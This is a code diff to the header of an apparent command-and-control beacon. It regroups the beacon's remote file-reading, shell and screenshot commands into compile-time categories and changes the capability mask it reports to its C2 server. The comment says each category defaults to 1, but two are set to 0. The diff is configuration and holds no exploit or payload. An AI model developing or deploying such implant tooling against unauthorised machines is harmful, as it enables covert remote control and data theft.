@@ -24,45 +24,28 @@ enum CommandType : UINT8
 // =============================================================================
 // Compile-time capability flags
 //
-// Each command has an AGENT_SUPPORT_<COMMAND> macro (default 1). Override to 0
-// per-platform/build (e.g. via a toolchain compile definition) to compile a
-// command out: it is then both unregistered in the dispatch table (main.cc) and
-// reported as unsupported in the Hello capability mask. These macros are the
-// single source of truth for which commands this beacon supports — the dispatch
-// wiring and BuildCapabilityMask() both derive from them.
+// Each FEATURE CATEGORY has a SUPPORT_<CATEGORY> macro (default 1). Override to
+// 0 per-platform/build (e.g. via a toolchain compile definition) to compile a
+// whole category out: every command it owns is then unregistered in the
+// dispatch table (main.cc) and its bit is cleared in the Hello capability mask.
+// These macros are the single source of truth for which feature categories this
+// beacon supports — the dispatch wiring and BuildCapabilityMask() both derive
+// from them. Hello and Exit are mandatory core commands and are always
+// registered; they are not feature-gated and not advertised in the mask.
+//
+// Category -> owned commands:
+//   FILESYSTEM  GetDirectoryContent, GetFileContent, GetFileChunkHash
+//   SHELL       OpenShell, CloseShell, ReadShell, WriteShell
+//   DISPLAY     GetDisplays, GetScreenshot
 // =============================================================================
-#ifndef AGENT_SUPPORT_HELLO
-#define AGENT_SUPPORT_HELLO 1
+#ifndef SUPPORT_FILESYSTEM
+#define SUPPORT_FILESYSTEM 0
 #endif
-#ifndef AGENT_SUPPORT_GET_DIRECTORY_CONTENT
-#define AGENT_SUPPORT_GET_DIRECTORY_CONTENT 1
+#ifndef SUPPORT_SHELL
+#define SUPPORT_SHELL 0
 #endif
-#ifndef AGENT_SUPPORT_GET_FILE_CONTENT
-#define AGENT_SUPPORT_GET_FILE_CONTENT 1
-#endif
-#ifndef AGENT_SUPPORT_GET_FILE_CHUNK_HASH
-#define AGENT_SUPPORT_GET_FILE_CHUNK_HASH 1
-#endif
-#ifndef AGENT_SUPPORT_WRITE_SHELL
-#define AGENT_SUPPORT_WRITE_SHELL 1
-#endif
-#ifndef AGENT_SUPPORT_READ_SHELL
-#define AGENT_SUPPORT_READ_SHELL 1
-#endif
-#ifndef AGENT_SUPPORT_GET_DISPLAYS
-#define AGENT_SUPPORT_GET_DISPLAYS 1
-#endif
-#ifndef AGENT_SUPPORT_GET_SCREENSHOT
-#define AGENT_SUPPORT_GET_SCREENSHOT 1
-#endif
-#ifndef AGENT_SUPPORT_CLOSE_SHELL
-#define AGENT_SUPPORT_CLOSE_SHELL 1
-#endif
-#ifndef AGENT_SUPPORT_EXIT
-#define AGENT_SUPPORT_EXIT 1
-#endif
-#ifndef AGENT_SUPPORT_OPEN_SHELL
-#define AGENT_SUPPORT_OPEN_SHELL 1
+#ifndef SUPPORT_DISPLAY
+#define SUPPORT_DISPLAY 1
 #endif
 
 #ifndef AGENT_BUILD_NUMBER
@@ -72,7 +55,7 @@ enum CommandType : UINT8
 #define AGENT_COMMIT_HASH "00000000"
 #endif
 #ifndef AGENT_API_VERSION
-#define AGENT_API_VERSION 2
+#define AGENT_API_VERSION 3
 #endif
 
 // Build metadata appended to the Hello response
@@ -85,11 +68,22 @@ struct AgentBuildInfo
 };
 #pragma pack(pop)
 
-// 256-bit capability mask appended to the Hello response. Bit i (byte i/8,
-// bit i%8, LSB-first) is set iff command code i is supported by this beacon.
-// Bits [CommandTypeCount .. 255] are reserved (0). The C2 reads a bit with
-// (Bits[i/8] >> (i%8)) & 1 to decide whether command code i is available.
-static constexpr USIZE CAPABILITY_MASK_BYTES = 32; // 256 bits
+// Capability categories advertised in the Hello response. The bit position of
+// each category equals its CapabilityBit value. Hello and Exit are mandatory
+// core commands and are intentionally NOT represented here (always available).
+enum CapabilityBit : UINT8
+{
+    Capability_FileSystem = 0,
+    Capability_Shell = 1,
+    Capability_Display = 2,
+    CapabilityBitCount
+};
+
+// 64-bit capability mask appended to the Hello response. Bit i (byte i/8,
+// bit i%8, LSB-first) is set iff feature category i is supported by this beacon.
+// Bits [CapabilityBitCount .. 63] are reserved (0). The C2 reads a bit with
+// (Bits[i/8] >> (i%8)) & 1 to decide whether category i is available.
+static constexpr USIZE CAPABILITY_MASK_BYTES = 8; // 64 bits
 
 #pragma pack(push, 1)
 struct CapabilityMask
@@ -98,30 +92,25 @@ struct CapabilityMask
 };
 #pragma pack(pop)
 
-// Build the capability mask at compile time from the AGENT_SUPPORT_* macros.
-// The bit position of each command equals its CommandType value.
+static_assert(CapabilityBitCount <= CAPABILITY_MASK_BYTES * 8, "CapabilityMask too small for categories");
+static_assert(sizeof(CapabilityMask) == 8, "CapabilityMask must stay 8 bytes on the wire");
+
+// Build the capability mask at compile time from the SUPPORT_* category macros.
+// The bit position of each category equals its CapabilityBit value.
 inline constexpr CapabilityMask BuildCapabilityMask() noexcept
 {
     CapabilityMask mask = {};
-    auto set = [&mask](CommandType command, int supported)
+    auto set = [&mask](CapabilityBit bit, int supported)
     {
         if (supported)
         {
-            USIZE bit = static_cast<USIZE>(command);
-            mask.Bits[bit / 8] |= static_cast<UINT8>(1u << (bit % 8));
+            USIZE b = static_cast<USIZE>(bit);
+            mask.Bits[b / 8] |= static_cast<UINT8>(1u << (b % 8));
         }
     };
-    set(Command_Hello,               AGENT_SUPPORT_HELLO);
-    set(Command_GetDirectoryContent, AGENT_SUPPORT_GET_DIRECTORY_CONTENT);
-    set(Command_GetFileContent,      AGENT_SUPPORT_GET_FILE_CONTENT);
-    set(Command_GetFileChunkHash,    AGENT_SUPPORT_GET_FILE_CHUNK_HASH);
-    set(Command_WriteShell,          AGENT_SUPPORT_WRITE_SHELL);
-    set(Command_ReadShell,           AGENT_SUPPORT_READ_SHELL);
-    set(Command_GetDisplays,         AGENT_SUPPORT_GET_DISPLAYS);
-    set(Command_GetScreenshot,       AGENT_SUPPORT_GET_SCREENSHOT);
-    set(Command_CloseShell,          AGENT_SUPPORT_CLOSE_SHELL);
-    set(Command_Exit,                AGENT_SUPPORT_EXIT);
-    set(Command_OpenShell,           AGENT_SUPPORT_OPEN_SHELL);
+    set(Capability_FileSystem, SUPPORT_FILESYSTEM);
+    set(Capability_Shell, SUPPORT_SHELL);
+    set(Capability_Display, SUPPORT_DISPLAY);
     return mask;
 }
 
